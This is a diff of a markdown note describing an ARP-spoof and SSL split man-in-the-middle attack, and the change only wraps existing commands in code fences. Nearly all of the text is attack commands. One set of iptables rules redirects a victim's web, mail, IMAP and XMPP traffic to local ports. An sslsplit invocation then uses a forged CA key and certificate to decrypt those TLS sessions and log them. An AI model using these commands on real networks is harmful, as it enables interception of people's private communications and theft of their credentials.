@@ -8,6 +8,7 @@ ARP Spoof
 SSL Split Attack
 ================
 1. Configure the iptables (make sure the victim can receive the packets)  
+```
 sudo sysctl -w net.ipv4.ip_forward=1  
 sudo iptables -t nat -F  
 sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080  
@@ -16,6 +17,7 @@ sudo iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 844
 sudo iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443  
 sudo iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443  
 sudo iptables -t nat -A PREROUTING -p tcp --dport 5222 -j REDIRECT --to-ports 8080  
+```
 2. Start the ssl split (You should pre-create directory in /tmp folder)  
 `sudo ./sslsplit -D -l connections.log -j /tmp/sslsplit/ -S /tmp/sslsplit/logdir/ -k cakey.pem -c cacert.pem ssl 0.0.0.0 8443 tcp 0.0.0.0 8080`  
 
